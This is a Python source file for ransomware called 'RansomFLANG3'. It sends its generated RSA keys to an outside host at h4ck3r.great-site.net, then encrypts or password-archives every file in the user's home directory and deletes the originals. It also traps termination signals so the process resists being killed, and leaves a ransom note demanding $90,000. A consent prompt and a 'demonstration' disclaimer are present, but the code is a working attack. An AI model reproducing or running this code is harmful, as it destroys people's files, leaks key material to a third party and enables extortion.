import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import glob
import base64
import hashlib
import py7zr
import requests
import signal
import pymsgbox
import time


# Defining Undead
def handler(signum, stack_frame):
    pymsgbox.alert("Just a Sec., Killing RansomFlang3..", "Terminating Fang3!!")
    time.sleep(2)
    pymsgbox.alert("Termination Successful.. Enjoy!", "Terminated Fang3!!")


# Initiating Undead
signal.signal(signal.SIGINT, handler)
signal.signal(signal.SIGABRT, handler)
signal.signal(signal.SIGALRM, handler)
signal.signal(signal.SIGTERM, handler)
signal.signal(signal.SIGTRAP, handler)


# Ransomware class
def transfer(public, private):
    keys = str(public) + str(private)
    keystr = base64.b64encode(keys.encode())

    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate",
               "Connection": "keep-alive",
               "Cookie": "__test=c4fb31400808230905e8bd4e7427142f",
               "Upgrade-Insecure-Requests": "1",
               "Cache-Control": "max-age=0"
               }
    response = requests.get(f"http://h4ck3r.great-site.net/RansomFLANG3/capture.php?key={keystr.decode()}",
                            headers=headers)


class RansomFLANG3:
    def __init__(self):
        self.public = None
        self.password = None
        self.generator()

    def generator(self):
        keys = RSA.generate(4096)
        self.public = keys.publickey()
        publicPEM = self.public.exportKey()
        privPEM = keys.exportKey()
        self.password = hashlib.md5(str(privPEM).encode()).hexdigest()
        self.encryptor()
        transfer(publicPEM, privPEM)

    def encryptor(self):

        try:

            dirct = '/tmp/RansomFLANG3'
            if os.path.isdir(dirct):
                os.system(f'rm -drf {dirct}')

            os.mkdir('/tmp/RansomFLANG3')
        except:
            pass

        encryp = PKCS1_OAEP.new(self.public)
        with open(f"{os.path.expanduser('~')}/Encrypts.txt", 'a') as writeout:
            writeout.write(str("List of Infected Files : \n"))

            for file in glob.glob(f"{os.path.expanduser('~')}/**", recursive=True):

                try:
                    if os.path.isfile(file):

                        if os.path.getsize(file) > 5242880:

                            with py7zr.SevenZipFile(f"{file}.FLANG3", mode='w', password=self.password) as archive:
                                archive.write(file, )

                            os.remove(file)
                            writeout.write(str(file + "\n"))

                        else:
                            encfile = hashlib.md5((str(file) + '.FLANG3').encode()).hexdigest()
                            with open(f'/tmp/RansomFLANG3/{encfile}', 'a') as encfp:
                                with open(file, 'rb') as orgfp:
                                    def rsa_encrypt(pubkey, msg, length=400):
                                        res = []
                                        for i in range(0, len(msg), length):
                                            res.append(str(pubkey.encrypt(msg[i:i + length])))
                                        return "".join(res)

                                    b64str = base64.b64encode(orgfp.read())
                                    encstr = rsa_encrypt(encryp, b64str)
                                    encfp.write(encstr)

                            os.remove(file)
                            os.replace(f'/tmp/RansomFLANG3/{encfile}', f'{file}.FLANG3')
                            writeout.write(str(file + "\n"))
                except:
                    pass

        self.show()

    def show(self):
        RansomString = f'''Your System is Infected With RansomFLANG3!!!
Mail Your Victim ID to us at userhashc0de@tutanota.com with $90000 USD ready.
-------------------
Your Victim ID is :
-------------------

{self.public.exportKey()}





---------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------

Okay, Demonstration ends Here!!

---------------
If You are a Victim, I don't Know How you end-up in this Mess, and I am not responsible for this at all.

But Whatever Don't Panic Visit [ https://bit.ly/3lZHIAu ]
Get all the base64 strings and decode them, match with your ID, and copy the Merged Private Key.
Download the RansomFLANG3 Decoder Form [ https://bit.ly/3AK4pgr ].
If it is not there then wait for a few weeks, I will upload it and you are Good to go.

If you are not Patient Enough, Then Download the Source Code [ http://h4ck3r.great-site.net/RansomFLANG3/source.py ] and design your own Decoder.

## If Source code is also not available then you are a Month Early, I am Sorry but you have no option either to wait for 1 month at least or to accept the Lose.
'''

        showfile = open(f"{os.path.expanduser('~')}/RansomFLANG3", 'a')
        showfile.write(RansomString)


# Initiate Ransomware
def main():
    consent = input('This is a RansomWare `RansomFLANG3`.\nWhatever Happens Next I am not Responsible\nIf you wish to '
                    'abort then type "exit" : ')
    if consent != 'exit':
        RansomFLANG3()
    else:
        print('Your system is safe')


main()
